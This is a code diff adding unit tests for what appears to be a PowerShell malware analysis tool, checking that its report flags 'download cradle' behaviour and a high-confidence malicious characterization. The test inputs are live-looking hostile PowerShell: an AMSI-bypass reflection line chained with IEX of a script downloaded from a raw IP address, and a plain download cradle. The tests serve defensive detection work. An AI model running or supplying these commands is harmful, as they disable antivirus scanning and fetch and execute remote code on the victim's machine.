@@ -124,3 +124,18 @@ describe('analyze — inflate plausibility', () => {
     expect(r.layers.some((l) => l.transform === 'Base64 → inflate' && (l.text ?? '').includes("IEX 'hi'"))).toBe(true)
   })
 })
+
+describe('analyze — signals in copyText (Phase 3)', () => {
+  it('lists behaviour signals and the characterization line in copyText', async () => {
+    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
+    expect(r.copyText).toContain('High-confidence malicious behaviour')
+    expect(r.copyText).toContain('Behaviour signals:')
+    expect(r.copyText).toContain('download cradle')
+  })
+
+  it('a plain download cradle lists the signal but no characterization line', async () => {
+    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
+    expect(r.copyText).toContain('download cradle')
+    expect(r.copyText).not.toContain('High-confidence malicious behaviour')
+  })
+})
